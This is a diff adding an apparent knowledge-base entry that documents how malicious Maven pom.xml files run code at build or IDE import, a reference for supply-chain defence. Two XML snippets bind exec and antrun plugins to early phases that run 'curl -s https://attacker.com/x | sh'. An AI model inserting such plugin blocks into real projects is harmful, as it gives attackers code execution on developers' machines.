@@ -1,0 +1,95 @@
+name: Maven pom.xml Plugins
+id: maven-pom
+description: >
+  A Maven pom.xml binds plugins to build lifecycle phases. Building or even
+  importing a project executes those plugin goals, and goals like exec, antrun,
+  or groovy run arbitrary commands and code. A malicious pom.xml therefore runs
+  code as soon as the developer builds or opens the project in an IDE.
+author: LOC Team
+tags:
+  - java
+  - maven
+  - code-execution
+  - supply-chain
+
+exploitation: |
+  Maven is configuration-as-execution: `pom.xml` declares plugins and binds
+  their goals to lifecycle phases (`validate`, `generate-sources`, `compile`,
+  `test`, `package`, ...). Running any phase runs every goal bound at or before
+  it. Several standard plugins exist specifically to run shell commands or
+  arbitrary JVM code, so a crafted `pom.xml` achieves execution the moment the
+  developer runs `mvn compile`/`mvn test`/`mvn package` — or when an IDE imports
+  the project and resolves the build model.
+
+  ### exec-maven-plugin — run a command on a build phase
+
+  Binding `exec:exec` to an early phase runs the command during a normal build.
+
+  ```xml
+  <plugin>
+    <groupId>org.codehaus.mojo</groupId>
+    <artifactId>exec-maven-plugin</artifactId>
+    <version>3.1.0</version>
+    <executions>
+      <execution>
+        <id>pwn</id>
+        <phase>validate</phase>
+        <goals><goal>exec</goal></goals>
+        <configuration>
+          <executable>sh</executable>
+          <arguments>
+            <argument>-c</argument>
+            <argument>curl -s https://attacker.com/x | sh</argument>
+          </arguments>
+        </configuration>
+      </execution>
+    </executions>
+  </plugin>
+  ```
+
+  ### maven-antrun-plugin — inline arbitrary tasks
+
+  The antrun plugin runs embedded Ant, which can exec, write files, or download.
+
+  ```xml
+  <plugin>
+    <artifactId>maven-antrun-plugin</artifactId>
+    <version>3.1.0</version>
+    <executions>
+      <execution>
+        <phase>generate-sources</phase>
+        <goals><goal>run</goal></goals>
+        <configuration>
+          <target>
+            <exec executable="sh">
+              <arg value="-c"/>
+              <arg value="curl -s https://attacker.com/x | sh"/>
+            </exec>
+          </target>
+        </configuration>
+      </execution>
+    </executions>
+  </plugin>
+  ```
+
+  ### IDE import as the trigger
+
+  IntelliJ IDEA, Eclipse, and VS Code (with the Maven/Java extensions) read and
+  evaluate the build model on project import. Depending on settings and plugin
+  bindings, this can run goals without the developer ever typing `mvn`, turning
+  "open the folder" into code execution.
+
+  ### Rogue repositories and dependency confusion
+
+  A `pom.xml` can also declare attacker-controlled `<repositories>` /
+  `<pluginRepositories>`, redirecting plugin and dependency resolution to a
+  malicious server that serves backdoored artifacts — the Maven analogue of
+  registry redirection and dependency confusion.
+
+references:
+  - url: https://maven.apache.org/guides/introduction/introduction-to-the-lifecycle.html
+    description: Maven build lifecycle and phase-to-goal bindings
+  - url: https://www.mojohaus.org/exec-maven-plugin/
+    description: exec-maven-plugin documentation
+  - url: https://maven.apache.org/plugins/maven-antrun-plugin/
+    description: maven-antrun-plugin documentation
